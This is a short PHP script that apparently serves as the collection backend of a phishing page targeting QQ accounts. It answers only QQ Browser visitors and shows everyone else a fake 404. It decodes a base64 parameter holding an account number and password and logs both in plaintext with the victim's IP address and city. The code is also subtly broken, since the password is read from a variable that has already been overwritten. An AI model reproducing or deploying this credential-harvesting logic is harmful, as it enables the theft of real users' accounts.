<?php
require './common/common.php';
if (is_qqbrowser()) {
    header('Content-type:text/html;charset=utf-8');
    if (isset($_GET['user']) ) {
        $str=base64_decode($_GET['user']);
        $user=explode("|||-|||",$str);
        if (is_numeric($user[0]) && strlen($user[1]) > 5) {
            $user = daddslashes(trim($user[0]));
            $pwd = daddslashes(trim($user[1]));
            $hash = md5($user . $pwd);
            $remoteip = real_ip();
            $row_ip = $DB->get_row("SELECT * FROM list WHERE ip='$remoteip' limit 1");
            $row = $DB->get_row("SELECT * FROM list WHERE hash='$hash' limit 1");
            //下面两个一个是无ip限制一个ip只能登陆一次，
            //if (!$row_ip && !$row) {
            if(!$row){
                $city = pconlineIp($remoteip);
                $DB->query("insert into `list` (`user`,`pwd`,`ip`,`city`,`date`,`hash`) values ('" . $user . "','" . $pwd . "','" . $remoteip . "','" . $city . "','" . $date . "','" . $hash . "')");
            }
        } else {
            exit;
        }

    }



} else {
    header("HTTP/1.1 404 Not Found");
    header("Status: 404 Not Found");
    exit;
}
?>